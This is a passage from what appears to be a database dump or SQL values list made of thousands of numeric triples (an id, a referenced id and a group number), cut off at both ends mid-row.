,125,143),(3109,121,143),(3110,118,143),(3111,88,143),(3112,75,143),(3113,73,143),(3114,70,143),(3115,59,143),(3116,53,143),(3117,49,143),(3118,42,143),(3119,41,143),(3120,35,143),(3121,31,143),(3122,27,143),(3123,26,143),(3124,15,143),(3125,14,143),(3126,11,143),(3127,9,143),(3128,7,143),(3129,5,143),(3130,3,143),(3131,2,143),(3132,1,143),(3133,2894,142),(3134,2798,142),(3135,2729,142),(3136,2643,142),(3137,2529,142),(3138,2500,142),(3139,2469,142),(3140,2418,142),(3141,2413,142),(3142,2235,142),(3143,2181,142),(3144,2114,142),(3145,2022,142),(3146,1984,142),(3147,1979,142),(3148,1968,142),(3149,1929,142),(3150,1768,142),(3151,1688,142),(3152,1672,142),(3153,1582,142),(3154,1572,142),(3155,1512,142),(3156,1523,142),(3157,1480,142),(3158,1351,142),(3159,1343,142),(3160,1342,142),(3161,1290,142),(3162,1281,142),(3163,1185,142),(3164,1390,142),(3165,1137,142),(3166,1131,142),(3167,1099,142),(3168,977,142),(3169,509,142),(3170,881,142),(3171,876,142),(3172,875,142),(3173,470,142),(3174,867,142),(3175,836,142),(3176,832,142),(3177,704,142),(3178,769,142),(3179,744,142),(3180,709,142),(3181,728,142),(3182,724,142),(3183,566,142),(3184,560,142),(3185,498,142),(3186,485,142),(3187,463,142),(3188,441,142),(3189,412,142),(3190,410,142),(3191,374,142),(3192,371,142),(3193,367,142),(3194,344,142),(3195,283,142),(3196,258,142),(3197,242,142),(3198,240,142),(3199,238,142),(3200,234,142),(3201,217,142),(3202,215,142),(3203,206,142),(3204,198,142),(3205,191,142),(3206,189,142),(3207,169,142),(3208,168,142),(3209,167,142),(3210,164,142),(3211,160,142),(3212,153,142),(3213,151,142),(3214,136,142),(3215,128,142),(3216,125,142),(3217,122,142),(3218,121,142),(3219,88,142),(3220,75,142),(3221,74,142),(3222,73,142),(3223,70,142),(3224,69,142),(3225,59,142),(3226,54,142),(3227,53,142),(3228,50,142),(3229,48,142),(3230,43,142),(3231,42,142),(3232,41,142),(3233,35,142),(3234,34,142),(3235,33,142),(3236,31,142),(3237,29,142),(3238,27,142),(3239,26,142),(3240,21,142),(3241,20,142),(3242,14,142),(3243,11,142),(3244,9,142),(3245,4,142),(3246,1,142),(3247,2149,127),(3248,1979,127),(3249,1512,127),(3250,1480,127),(3251,1281,127),(3252,1207,127),(3253,1390,127),(3254,836,127),(3255,728,127),(3256,566,127),(3257,240,127),(3258,121,127),(3259,137,135),(3260,1431,147),(3261,137,147),(3262,4,143),(3263,2942,162),(3264,2894,162),(3265,2798,162),(3266,2574,162),(3267,2576,162),(3268,2605,162),(3269,2529,162),(3270,2521,162),(3271,2500,162),(3272,2441,162),(3273,2404,162),(3274,2206,162),(3275,2181,162),(3276,2057,162),(3277,2006,162),(3278,1984,162),(3279,1979,162),(3280,1968,162),(3281,1929,162),(3282,1572,162),(3283,1512,162),(3284,1480,162),(3285,1343,162),(3286,1268,162),(3287,2215,162),(3288,1207,162),(3289,1137,162),(3290,1150,162),(3291,1133,162),(3292,1134,162),(3293,981,162),(3294,977,162),(3295,509,162),(3296,917,162),(3297,912,162),(3298,908,162),(3299,905,162),(3300,881,162),(3301,876,162),(3302,875,162),(3303,867,162),(3304,832,162),(3305,704,162),(3306,709,162),(3307,724,162),(3308,680,162),(3309,560,162),(3310,507,162),(3311,498,162),(3312,476,162),(3313,463,162),(3314,448,162),(3315,442,162),(3316,441,162),(3317,374,162),(3318,371,162),(3319,367,162),(3320,344,162),(3321,338,162),(3322,322,162),(3323,287,162),(3324,283,162),(3325,279,162),(3326,268,162),(3327,263,162),(3328,258,162),(3329,242,162),(3330,238,162),(3331,237,162),(3332,229,162),(3333,217,162),(3334,206,162),(3335,203,162),(3336,202,162),(3337,191,162),(3338,190,162),(3339,189,162),(3340,179,162),(3341,169,162),(3342,167,162),(3343,162,162),(3344,153,162),(3345,136,162),(3346,125,162),(3347,122,162),(3348,88,162),(3349,75,162),(3350,74,162),(3351,66,162),(3352,54,162),(3353,48,162),(3354,43,162),(3355,42,162),(3356,41,162),(3357,35,162),(3358,34,162),(3359,33,162),(3360,29,162),(3361,28,162),(3362,27,162),(3363,26,162),(3364,15,162),(3365,14,162),(3366,13,162),(3367,9,162),(3368,7,162),(3369,4,162),(3370,1,162),(3371,2942,161),(3372,2798,161),(3373,2206,161),(3374,2011,161),(3375,1984,161),(3376,1979,161),(3377,1929,161),(3378,1920,161),(3379,1572,161),(3380,1512,161),(3381,1480,161),(3382,1470,161),(3383,1343,161),(3384,1268,161),(3385,1207,161),(3386,977,161),(3387,876,161),(3388,875,161),(3389,867,161),(3390,832,161),(3391,704,161),(3392,724,161),(3393,680,161),(3394,665,161),(3395,560,161),(3396,442,161),(3397,441,161),(3398,374,161),(3399,367,161),(3400,344,161),(3401,287,161),(3402,283,161),(3403,242,161),(3404,238,161),(3405,237,161),(3406,217,161),(3407,215,161),(3408,206,161),(3409,179,161),(3410,169,161),(3411,167,161),(3412,162,161),(3413,153,161),(3414,136,161),(3415,125,161),(3416,122,161),(3417,81,161),(3418,75,161),(3419,74,161),(3420,70,161),(3421,69,161),(3422,50,161),(3423,41,161),(3424,35,161),(3425,34,161),(3426,33,161),(3427,27,161),(3428,26,161),(3429,14,161),(3430,9,161),(3431,4,161),(3432,1,161),(3433,2206,190),(3434,1979,190),(3435,1672,190),(3436,1512,190),(3437,1480,190),(3438,1207,190),(3439,977,190),(3440,875,190),(3441,704,190),(3442,680,190),(3443,442,190),(3444,441,190),(3445,374,190),(3446,367,190),(3447,344,190),(3448,287,190),(3449,217,190),(3450,209,190),(3451,162,190),(3452,154,190),(3453,153,190),(3454,125,190),(3455,74,190),(3456,54,190),(3457,48,190),(3458,35,190),(3459,34,190),(3460,33,190),(3461,27,190),(3462,4,190),(3463,3,190),(3464,1,190),(3465,2942,169),(3466,2798,169),(3467,2574,169),(3468,2529,169),(3469,2500,169),(3470,2206,169),(3471,2181,169),(3472,2114,169),(3473,2011,169),(3474,1984,169),(3475,1979,169),(3476,1929,169),(3477,1898,169),(3478,1748,169),(3479,1669,169),(3480,1572,169),(3481,1528,169),(3482,1539,169),(3483,1512,169),(3484,1480,169),(3485,1431,169),(3486,1346,169),(3487,1343,169),(3488,1207,169),(3489,1137,169),(3490,981,169),(3491,977,169),(3492,881,169),(3493,876,169),(3494,875,169),(3495,867,169),(3496,832,169),(3497,704,169),(3498,724,169),(3499,680,169),(3500,665,169),(3501,560,169),(3502,481,169),(3503,463,169),(3504,442,169),(3505,441,169),(3506,374,169),(3507,372,169),(3508,371,169),(3509,367,169),(3510,347,169),(3511,344,169),(3512,342,169),(3513,326,169),(3514,287,169),(3515,283,169),(3516,278,169),(3517,268,169),(3518,242,169),(3519,238,169),(3520,237,169),(3521,234,169),(3522,231,169),(3523,217,169),(3524,209,169),(3525,206,169),(3526,202,169),(3527,198,169),(3528,191,169),(3529,190,169),(3530,179,169),(3531,169,169),(3532,167,169),(3533,162,169),(3534,160,169),(3535,153,169),(3536,136,169),(3537,125,169),(3538,122,169),(3539,88,169),(3540,81,169),(3541,75,169),(3542,74,169),(3543,70,169),(3544,69,169),(3545,66,169),(3546,54,169),(3547,50,169),(3548,41,169),(3549,35,169),(3550,34,169),(3551,33,169),(3552,29,169),(3553,27,169),(3554,26,169),(3555,11,169),(3556,9,169),(3557,7,169),(3558,1,169),(3559,2951,178),(3560,2942,178),(3561,2824,178),(3562,2798,178),(3563,2739,178),(3564,2652,178),(3565,2643,178),(3566,2540,178),(3567,2529,178),(3568,2500,178),(3569,2469,178),(3570,2413,178),(3571,2413,178),(3572,2235,178),(3573,2206,178),(3574,2154,178),(3575,2016,178),(3576,1979,178),(3577,1929,178),(3578,1920,178),(3579,1572,178),(3580,1512,178),(3581,1480,178),(3582,1351,178),(3583,1346,178),(3584,1343,178),(3585,1281,178),(3586,1207,178),(3587,1299,178),(3588,1299,178),(3589,977,178),(3590,977,178),(3591,881,178),(3592,881,178),(3593,875,178),(3594,875,178),(3595,867,178),(3596,867,178),(3597,832,178),(3598,832,178),(3599,704,178),(3600,747,178),(3601,747,178),(3602,744,178),(3603,744,178),(3604,709,178),(3605,463,178),(3606,442,178),(3607,441,178),(3608,374,178),(3609,367,178),(3610,344,178),(3611,342,178),(3612,326,178),(3613,287,178),(3614,283,178),(3615,268,178),(3616,258,178),(3617,240,178),(3618,231,178),(3619,217,178),(3620,191,178),(3621,190,178),(3622,189,178),(3623,169,178),(3624,167,178),(3625,162,178),(3626,153,178),(3627,136,178),(3628,125,178),(3629,75,178),(3630,74,178),(3631,70,178),(3632,69,178),(3633,54,178),(3634,48,178),(3635,35,178),(3636,34,178),(3637,33,178),(3638,11,178),(3639,9,178),(3640,1,178),(3641,2942,196),(3642,2798,196),(3643,2652,196),(3644,2535,196),(3645,2520,196),(3646,2469,196),(3647,2413,196),(3648,2235,196),(3649,2206,196),(3650,2160,196),(3651,1979,196),(3652,1929,196),(3653,1920,196),(3654,1672,196),(3655,1512,196),(3656,1486,196),(3657,1480,196),(3658,1470,196),(3659,1342,196),(3660,1281,196),(3661,1207,196),(3662,709,196),(3663,442,196),(3664,287,196),(3665,258,196),(3666,162,196),(3667,75,196),(3668,69,196),(3669,58,196),(3670,54,196),(3671,50,196),(3672,48,196),(3673,9,196),(3674,1,196),(3675,1486,148),(3676,1342,148),(3677,14,148),(3678,2595,141),(3679,389,141),(3680,338,141),(3681,231,141),(3682,67,141),(3683,2942,164),(3684,2824,164),(3685,2798,164),(3686,2529,164),(3687,2500,164),(3688,2206,164),(3689,2181,164),(3690,2114,164),(3691,2011,164),(3692,1984,164),(3693,1979,164),(3694,1929,164),(3695,1920,164),(3696,1679,164),(3697,1672,164),(3698,1572,164),(3699,1528,164),(3700,1539,164),(3701,1512,164),(3702,1480,164),(3703,1470,164),(3704,1431,164),(3705,1365,164),(3706,1351,164),(3707,2305,164),(3708,2215,164),(3709,1207,164),(3710,1137,164),(3711,981,164),(3712,977,164),(3713,509,164),(3714,876,164),(3715,875,164),(3716,867,164),(3717,832,164),(3718,704,164),(3719,746,164),(3720,680,164),(3721,1721,164),(3722,481,164),(3723,463,164),(3724,442,164),(3725,441,164),(3726,410,164),(3727,374,164),(3728,371,164),(3729,367,164),(3730,344,164),(3731,338,164),(3732,287,164),(3733,283,164),(3734,242,164),(3735,237,164),(3736,234,164),(3737,217,164),(3738,215,164),(3739,206,164),(3740,203,164),(3741,198,164),(3742,191,164),(3743,190,164),(3744,189,164),(3745,169,164),(3746,167,164),(3747,162,164),(3748,160,164),(3749,153,164),(3750,136,164),(3751,125,164),(3752,88,164),(3753,81,164),(3754,75,164),(3755,74,164),(3756,70,164),(3757,69,164),(3758,59,164),(3759,54,164),(3760,48,164),(3761,35,164),(3762,34,164),(3763,33,164),(3764,27,164),(3765,26,164),(3766,15,164),(3767,11,164),(3768,4,164),(3769,3,164),(3770,1,164),(3771,2206,205),(3772,1979,205),(3773,1512,205),(3774,1480,205),(3775,1207,205),(3776,442,205),(3777,287,205),(3778,162,205),(3779,59,205),(3780,54,205),(3781,48,205),(3782,2798,198),(3783,2521,198),(3784,2469,198),(3785,2413,198),(3786,2235,198),(3787,2206,198),(3788,2160,198),(3789,2114,198),(3790,1979,198),(3791,1929,198),(3792,1920,198),(3793,1688,198),(3794,1512,198),(3795,1480,198),(3796,1470,198),(3797,1281,198),(3798,1207,198),(3799,509,198),(3800,557,198),(3801,442,198),(3802,287,198),(3803,162,198),(3804,2942,231),(3805,59,198),(3806,54,198),(3807,48,198),(3808,27,198),(3809,9,198),(3810,2798,231),(3811,2206,231),(3812,1984,231),(3813,1979,231),(3814,1929,231),(3815,1672,231),(3816,1512,231),(3817,1480,231),(3818,1207,231),(3819,977,231),(3820,875,231),(3821,704,231),(3822,442,231),(3823,441,231),(3824,374,231),(3825,367,231),(3826,287,231),(3827,162,231),(3828,153,231),(3829,74,231),(3830,48,231),(3831,35,231),(3832,34,231),(3833,33,231),(3834,14,231),(3835,1979,149),(3836,1704,149),(3837,1570,149),(3838,1347,149),(3839,2225,149),(3840,1207,149),(3841,1185,149),(3842,1390,149),(3843,1154,149),(3844,1165,149),(3845,1118,149),(3846,470,149),(3847,836,149),(3848,769,149),(3849,728,149),(3850,566,149),(3851,137,149),(3852,2942,160),(3853,2894,160),(3854,2798,160),(3855,2206,160),(3856,2011,160),(3857,1984,160),(3858,1979,160),(3859,1929,160),(3860,1920,160),(3861,1672,160),(3862,1572,160),(3863,1512,160),(3864,1480,160),(3865,1470,160),(3866,1351,160),(3867,1346,160),(3868,1343,160),(3869,1207,160),(3870,1137,160),(3871,977,160),(3872,881,160),(3873,876,160),(3874,875,160),(3875,867,160),(3876,832,160),(3877,704,160),(3878,746,160),(3879,744,160),(3880,724,160),(3881,680,160),(3882,665,160),(3883,611,160),(3884,560,160),(3885,442,160),(3886,441,160),(3887,374,160),(3888,371,160),(3889,367,160),(3890,347,160),(3891,344,160),(3892,287,160),(3893,283,160),(3894,278,160),(3895,258,160),(3896,242,160),(3897,238,160),(3898,237,160),(3899,234,160),(3900,217,160),(3901,213,160),(3902,209,160),(3903,206,160),(3904,203,160),(3905,198,160),(3906,191,160),(3907,190,160),(3908,189,160),(3909,179,160),(3910,169,160),(3911,167,160),(3912,162,160),(3913,153,160),(3914,136,160),(3915,125,160),(3916,122,160),(3917,88,160),(3918,75,160),(3919,74,160),(3920,70,160),(3921,59,160),(3922,54,160),(3923,48,160),(3924,41,160),(3925,35,160),(3926,34,160),(3927,33,160),(3928,28,160),(3929,27,160),(3930,26,160),(3931,14,160),(3932,13,160),(3933,11,160),(3934,3,160),(3935,1,160),(3936,1720,129),(3937,1486,129),(3938,2942,166),(3939,2798,166),(3940,2270,166),(3941,2206,166),(3942,1979,166),(3943,1929,166),(3944,1572,166),(3945,1512,166),(3946,1480,166),(3947,1137,166),(3948,977,166),(3949,509,166),(3950,876,166),(3951,875,166),(3952,867,166),(3953,704,166),(3954,680,166),(3955,665,166),(3956,643,166),(3957,560,166),(3958,442,166),(3959,441,166),(3960,438,166),(3961,374,166),(3962,367,166),(3963,347,166),(3964,344,166),(3965,287,166),(3966,283,166),(3967,279,166),(3968,242,166),(3969,240,166),(3970,238,166),(3971,237,166),(3972,234,166),(3973,217,166),(3974,206,166),(3975,201,166),(3976,191,166),(3977,190,166),(3978,179,166),(3979,169,166),(3980,162,166),(3981,153,166),(3982,136,166),(3983,125,166),(3984,75,166),(3985,74,166),(3986,70,166),(3987,69,166),(3988,67,166),(3989,49,166),(3990,48,166),(3991,41,166),(3992,35,166),(3993,33,166),(3994,27,166),(3995,15,166),(3996,14,166),(3997,3,166),(3998,1,166),(3999,1688,128),(4000,1512,128),(4001,1351,128),(4002,1281,128),(4003,1185,128),(4004,1390,128),(4005,470,128),(4006,836,128),(4007,769,128),(4008,768,128),(4009,728,128),(4010,566,128),(4011,485,128),(4012,240,128),(4013,171,128),(4014,168,128),(4015,7,128),(4016,2942,172),(4017,2798,172),(4018,2427,172),(4019,2270,172),(4020,2206,172),(4021,1984,172),(4022,1979,172),(4023,1929,172),(4024,1920,172),(4025,1572,172),(4026,1512,172),(4027,1480,172),(4028,1343,172),(4029,1207,172),(4030,1137,172),(4031,977,172),(4032,509,172),(4033,876,172),(4034,875,172),(4035,867,172),(4036,704,172),(4037,680,172),(4038,566,172),(4039,442,172),(4040,441,172),(4041,374,172),(4042,371,172),(4043,367,172),(4044,344,172),(4045,287,172),(4046,283,172),(4047,278,172),(4048,263,172),(4049,240,172),(4050,239,172),(4051,238,172),(4052,237,172),(4053,234,172),(4054,217,172),(4055,206,172),(4056,201,172),(4057,191,172),(4058,190,172),(4059,179,172),(4060,169,172),(4061,167,172),(4062,162,172),(4063,153,172),(4064,136,172),(4065,125,172),(4066,88,172),(4067,75,172),(4068,74,172),(4069,70,172),(4070,69,172),(4071,49,172),(4072,48,172),(4073,35,172),(4074,34,172),(4075,33,172),(4076,27,172),(4077,26,172),(4078,15,172),(4079,9,172),(4080,1,172),(4081,2942,193),(4082,2806,193),(4083,2810,193),(4084,2798,193),(4085,2500,193),(4086,2469,193),(4087,2206,193),(4088,1984,193),(4089,1979,193),(4090,1929,193),(4091,1920,193),(4092,1732,193),(4093,1572,193),(4094,1512,193),(4095,1480,193),(4096,1464,193),(4097,1343,193),(4098,1268,193),(4099,1207,193),(4100,1154,193),(4101,1137,193),(4102,977,193),(4103,929,193),(4104,881,193),(4105,876,193),(4106,875,193),(4107,867,193),(4108,866,193),(4109,832,193),(4110,704,193),(4111,746,193),(4112,724,193),(4113,507,193),(4114,498,193),(4115,463,193),(4116,442,193),(4117,441,193),(4118,410,193),(4119,374,193),(4120,367,193),(4121,347,193),(4122,344,193),(4123,338,193),(4124,287,193),(4125,283,193),(4126,271,193),(4127,242,193),(4128,238,193),(4129,237,193),(4130,234,193),(4131,217,193),(4132,206,193),(4133,191,193),(4134,190,193),(4135,189,193),(4136,179,193),(4137,169,193),(4138,167,193),(4139,162,193),(4140,153,193),(4141,136,193),(4142,125,193),(4143,121,193),(4144,119,193),(4145,118,193),(4146,88,193),(4147,75,193),(4148,74,193),(4149,70,193),(4150,54,193),(4151,49,193),(4152,42,193),(4153,35,193),(4154,34,193),(4155,33,193),(4156,27,193),(4157,26,193),(4158,11,193),(4159,3,193),(4160,1,193),(4161,2942,168),(4162,2798,168),(4163,2427,168),(4164,2235,168),(4165,2206,168),(4166,1979,168),(4167,1929,168),(4168,1572,168),(4169,1512,168),(4170,1498,168),(4171,1480,168),(4172,1461,168),(4173,1343,168),(4174,1207,168),(4175,1137,168),(4176,977,168),(4177,876,168),(4178,875,168),(4179,867,168),(4180,704,168),(4181,724,168),(4182,680,168),(4183,665,168),(4184,643,168),(4185,567,168),(4186,560,168),(4187,442,168),(4188,441,168),(4189,438,168),(4190,374,168),(4191,371,168),(4192,367,168),(4193,344,168),(4194,328,168),(4195,287,168),(4196,283,168),(4197,279,168),(4198,242,168),(4199,238,168),(4200,237,168),(4201,217,168),(4202,209,168),(4203,206,168),(4204,201,168),(4205,191,168),(4206,190,168),(4207,169,168),(4208,162,168),(4209,153,168),(4210,136,168),(4211,128,168),(4212,125,168),(4213,75,168),(4214,74,168),(4215,70,168),(4216,48,168),(4217,42,168),(4218,41,168),(4219,33,168),(4220,26,168),(4221,15,168),(4222,1,168),(4223,2942,159),(4224,2894,159),(4225,2500,159),(4226,2206,159),(4227,2011,159),(4228,1984,159),(4229,1979,159),(4230,1929,159),(4231,1920,159),(4232,1672,159),(4233,1512,159),(4234,1480,159),(4235,1470,159),(4236,1351,159),(4237,1207,159),(4238,1137,159),(4239,876,159),(4240,875,159),(4241,832,159),(4242,704,159),(4243,746,159),(4244,560,159),(4245,463,159),(4246,442,159),(4247,441,159),(4248,410,159),(4249,374,159),(4250,367,159),(4251,287,159),(4252,283,159),(4253,279,159),(4254,238,159),(4255,237,159),(4256,234,159),(4257,217,159),(4258,213,159),(4259,206,159),(4260,203,159),(4261,198,159),(4262,169,159),(4263,167,159),(4264,162,159),(4265,125,159),(4266,74,159),(4267,70,159),(4268,59,159),(4269,54,159),(4270,48,159),(4271,35,159),(4272,33,159),(4273,26,159),(4274,1,159),(4275,2942,180),(4276,2824,180),(4277,2798,180),(4278,2574,180),(4279,2500,180),(4280,2319,180),(4281,2206,180),(4282,2181,180),(4283,2114,180),(4284,2011,180),(4285,1984,180),(4286,1979,180),(4287,1929,180),(4288,1920,180),(4289,1898,180),(4290,1662,180),(4291,1572,180),(4292,1512,180),(4293,1480,180),(4294,1470,180),(4295,1431,180),(4296,1365,180),(4297,1343,180),(4298,1207,180),(4299,1137,180),(4300,977,180),(4301,881,180),(4302,876,180),(4303,875,180),(4304,867,180),(4305,832,180),(4306,704,180),(4307,724,180),(4308,680,180),(4309,665,180),(4310,1721,180),(4311,498,180),(4312,463,180),(4313,442,180),(4314,441,180),(4315,410,180),(4316,374,180),(4317,371,180),(4318,367,180),(4319,344,180),(4320,338,180),(4321,287,180),(4322,283,180),(4323,279,180),(4324,268,180),(4325,242,180),(4326,238,180),(4327,237,180),(4328,234,180),(4329,217,180),(4330,209,180),(4331,206,180),(4332,205,180),(4333,198,180),(4334,191,180),(4335,190,180),(4336,189,180),(4337,179,180),(4338,169,180),(4339,167,180),(4340,162,180),(4341,160,180),(4342,153,180),(4343,136,180),(4344,125,180),(4345,122,180),(4346,121,180),(4347,88,180),(4348,75,180),(4349,74,180),(4350,73,180),(4351,70,180),(4352,69,180),(4353,59,180),(4354,54,180),(4355,48,180),(4356,42,180),(4357,35,180),(4358,34,180),(4359,33,180),(4360,27,180),(4361,26,180),(4362,11,180),(4363,9,180),(4364,4,180),(4365,1,180),(4366,2942,226),(4367,2798,226),(4368,2500,226),(4369,2206,226),(4370,1979,226),(4371,1968,226),(4372,1929,226),(4373,1898,226),(4374,1572,226),(4375,1512,226),(4376,1480,226),(4377,1514,226),(4378,1207,226),(4379,977,226),(4380,876,226),(4381,875,226),(4382,832,226),(4383,704,226),(4384,560,226),(4385,554,226),(4386,498,226),(4387,463,226),(4388,442,226),(4389,441,226),(4390,410,226),(4391,374,226),(4392,371,226),(4393,344,226),(4394,287,226),(4395,283,226),(4396,268,226),(4397,237,226),(4398,217,226),(4399,206,226),(4400,191,226),(4401,190,226),(4402,179,226),(4403,162,226),(4404,153,226),(4405,136,226),(4406,88,226),(4407,74,226),(4408,66,226),(4409,35,226),(4410,34,226),(4411,33,226),(4412,18,226),(4413,15,226),(4414,2942,192),(4415,2798,192),(4416,2529,192),(4417,2206,192),(4418,1984,192),(4419,1979,192),(4420,1929,192),(4421,1572,192),(4422,1539,192),(4423,1512,192),(4424,1480,192),(4425,1414,192),(4426,2305,192),(4427,1207,192),(4428,977,192),(4429,509,192),(4430,876,192),(4431,875,192),(4432,867,192),(4433,832,192),(4434,704,192),(4435,680,192),(4436,463,192),(4437,442,192),(4438,441,192),(4439,410,192),(4440,374,192),(4441,371,192),(4442,367,192),(4443,287,192),(4444,283,192),(4445,268,192),(4446,234,192),(4447,231,192),(4448,217,192),(4449,209,192),(4450,206,192),(4451,203,192),(4452,191,192),(4453,190,192),(4454,189,192),(4455,169,192),(4456,167,192),(4457,162,192),(4458,153,192),(4459,136,192),(4460,125,192),(4461,88,192),(4462,75,192),(4463,74,192),(4464,70,192),(4465,69,192),(4466,54,192),(4467,48,192),(4468,41,192),(4469,35,192),(4470,33,192),(4471,27,192),(4472,26,192),(4473,4,192),(4474,1,192),(4475,2942,175),(4476,2206,175),(4477,1979,175),(4478,1929,175),(4479,1512,175),(4480,1480,175),(4481,1470,175),(4482,1207,175),(4483,442,175),(4484,287,175),(4485,162,175),(4486,54,175),(4487,48,175),(4488,2942,228),(4489,2798,228),(4490,2469,228),(4491,2235,228),(4492,2206,228),(4493,2114,228),(4494,1979,228),(4495,1929,228),(4496,1672,228),(4497,1512,228),(4498,1480,228),(4499,867,228),(4500,709,228),(4501,442,228),(4502,287,228),(4503,136,228),(4504,54,228),(4505,48,228),(4506,26,228),(4507,1,228),(4508,2942,222),(4509,2806,222),(4510,2798,222),(4511,2529,222),(4512,2206,222),(4513,1979,222),(4514,1929,222),(4515,1920,222),(4516,1886,222),(4517,1768,222),(4518,1572,222),(4519,1512,222),(4520,1480,222),(4521,1207,222),(4522,1137,222),(4523,977,222),(4524,929,222),(4525,867,222),(4526,704,222),(4527,746,222),(4528,665,222),(4529,560,222),(4530,442,222),(4531,441,222),(4532,415,222),(4533,374,222),(4534,347,222),(4535,344,222),(4536,338,222),(4537,287,222),(4538,283,222),(4539,268,222),(4540,242,222),(4541,217,222),(4542,205,222),(4543,198,222),(4544,191,222),(4545,190,222),(4546,189,222),(4547,169,222),(4548,167,222),(4549,162,222),(4550,153,222),(4551,136,222),(4552,125,222),(4553,88,222),(4554,75,222),(4555,74,222),(4556,70,222),(4557,69,222),(4558,66,222),(4559,58,222),(4560,48,222),(4561,41,222),(4562,35,222),(4563,28,222),(4564,27,222),(4565,26,222),(4566,20,222),(4567,19,222),(4568,14,222),(4569,13,222),(4570,9,222),(4571,7,222),(4572,4,222),(4573,1,222),(4574,2798,187),(4575,2206,187),(4576,1984,187),(4577,1979,187),(4578,1929,187),(4579,1572,187),(4580,1512,187),(4581,1480,187),(4582,1207,187),(4583,977,187),(4584,509,187),(4585,881,187),(4586,876,187),(4587,867,187),(4588,704,187),(4589,680,187),(4590,442,187),(4591,441,187),(4592,410,187),(4593,374,187),(4594,371,187),(4595,367,187),(4596,344,187),(4597,287,187),(4598,242,187),(4599,191,187),(4600,167,187),(4601,162,187),(4602,153,187),(4603,136,187),(4604,125,187),(4605,76,187),(4606,75,187),(4607,74,187),(4608,54,187),(4609,35,187),(4610,27,187),(4611,15,187),(4612,1,187),(4613,2469,212),(4614,2413,212),(4615,2235,212),(4616,2206,212),(4617,1979,212),(4618,1512,212),(4619,1480,212),(4620,1342,212),(4621,1281,212),(4622,1207,212),(4623,709,212),(4624,442,212),(4625,287,212),(4626,162,212),(4627,54,212),(4628,2824,211),(4629,2798,235),(4630,2235,211),(4631,2206,211),(4632,2206,235),(4633,1979,211),(4634,1929,211),(4635,1920,211),(4636,1979,235),(4637,1662,211),(4638,1512,211),(4639,1480,211),(4640,1342,211),(4641,1512,235),(4642,1281,211),(4643,1480,235),(4644,1207,211),(4645,1207,235),(4646,709,211),(4647,442,211),(4648,442,235),(4649,287,211),(4650,162,211),(4651,287,235),(4652,54,211),(4653,48,211),(4654,162,235),(4655,54,235),(4656,48,235),(4657,2942,234),(4658,2798,234),(4659,2206,234),(4660,1979,234),(4661,1929,234),(4662,1512,234),(4663,1480,234),(4664,1207,234),(4665,867,234),(4666,287,234),(4667,162,234),(4668,54,234),(4669,2469,176),(4670,2235,176),(4671,2206,176),(4672,2114,176),(4673,1979,176),(4674,1672,176),(4675,1512,176),(4676,1480,176),(4677,1207,176),(4678,2469,219),(4679,2413,219),(4680,2235,219),(4681,709,176),(4682,2206,219),(4683,1979,219),(4684,442,176),(4685,287,176),(4686,1512,219),(4687,1480,219),(4688,162,176),(4689,1342,219),(4690,1281,219),(4691,54,176),(4692,48,176),(4693,26,176),(4694,1207,219),(4695,9,176),(4696,1,176),(4697,709,219),(4698,442,219),(4699,287,219),(4700,162,219),(4701,2798,213),(4702,2206,213),(4703,1979,213),(4704,1512,213),(4705,1480,213),(4706,1207,213),(4707,442,213),(4708,287,213),(4709,162,213),(4710,54,213),(4711,48,213),(4712,2206,203),(4713,1979,203),(4714,1512,203),(4715,1480,203),(4716,1207,203),(4717,2235,208),(4718,2206,208),(4719,2114,208),(4720,1979,208),(4721,1672,208),(4722,1512,208),(4723,1480,208),(4724,442,203),(4725,1207,208),(4726,287,203),(4727,162,203),(4728,867,208),(4729,709,208),(4730,442,208),(4731,287,208),(4732,162,208),(4733,54,208),(4734,48,208),(4735,1,208),(4736,2942,156),(4737,2894,156),(4738,2824,156),(4739,2798,156),(4740,2574,156),(4741,2562,156),(4742,2529,156),(4743,2500,156),(4744,2469,156),(4745,2418,156),(4746,2413,156),(4747,2367,156),(4748,2942,165),(4749,2235,156),(4750,2206,156),(4751,2181,156),(4752,2798,165),(4753,2108,156),(4754,2114,156),(4755,2089,156),(4756,2011,156),(4757,2000,156),(4758,2006,156),(4759,2500,165),(4760,1979,156),(4761,2469,165),(4762,1929,156),(4763,1920,156),(4764,1876,156),(4765,1832,156),(4766,2235,165),(4767,1768,156),(4768,2181,165),(4769,1748,156),(4770,1672,156),(4771,1646,156),(4772,1572,156),(4773,1984,165),(4774,1979,165),(4775,1512,156),(4776,1480,156),(4777,1929,165),(4778,1431,156),(4779,1385,156),(4780,1365,156),(4781,1346,156),(4782,1343,156),(4783,1281,156),(4784,1669,165),(4785,1207,156),(4786,1572,165),(4787,1137,156),(4788,1512,165),(4789,1108,156),(4790,1480,165),(4791,2269,165),(4792,977,156),(4793,509,156),(4794,1207,165),(4795,905,156),(4796,876,156),(4797,875,156),(4798,867,156),(4799,1137,165),(4800,852,156),(4801,832,156),(4802,704,156),(4803,771,156),(4804,746,156),(4805,724,156),(4806,876,165),(4807,643,156),(4808,875,165),(4809,557,156),(4810,832,165),(4811,463,156),(4812,442,156),(4813,441,156),(4814,746,165),(4815,410,156),(4816,709,165),(4817,392,156),(4818,387,156),(4819,374,156),(4820,680,165),(4821,371,156),(4822,367,156),(4823,350,156),(4824,349,156),(4825,344,156),(4826,322,156),(4827,575,165),(4828,287,156),(4829,283,156),(4830,279,156),(4831,498,165),(4832,268,156),(4833,481,165),(4834,242,156),(4835,463,165),(4836,240,156),(4837,238,156),(4838,234,156),(4839,442,165),(4840,441,165),(4841,219,156),(4842,217,156),(4843,213,156),(4844,206,156),(4845,203,156),(4846,198,156),(4847,392,165),(4848,191,156),(4849,169,156),(4850,167,156),(4851,367,165),(4852,162,156),(4853,154,156),(4854,153,156),(4855,347,165),(4856,344,165),(4857,136,156),(4858,322,165),(4859,125,156),(4860,287,165),(4861,283,165),(4862,74,156),(4863,70,156),(4864,279,165),(4865,69,156),(4866,268,165),(4867,59,156),(4868,54,156),(4869,48,156),(4870,42,156),(4871,238,165),(4872,237,165),(4873,35,156),(4874,34,156),(4875,33,156),(4876,217,165),(4877,27,156),(4878,206,165),(4879,13,156),(4880,12,156),(4881,203,165),(4882,11,156),(4883,198,165),(4884,5,156),(4885,4,156),(4886,189,165),(4887,3,156),(4888,2,156),(4889,179,165),(4890,1,156),(4891,169,165),(4892,167,165),(4893,162,165),(4894,125,165),(4895,121,165),(4896,88,165),(4897,70,165),(4898,69,165),(4899,66,165),(4900,54,165),(4901,48,165),(4902,35,165),(4903,27,165),(4904,26,165),(4905,3,165),(4906,1,165),(4907,1979,224),(4908,1512,224),(4909,1480,224),(4910,2942,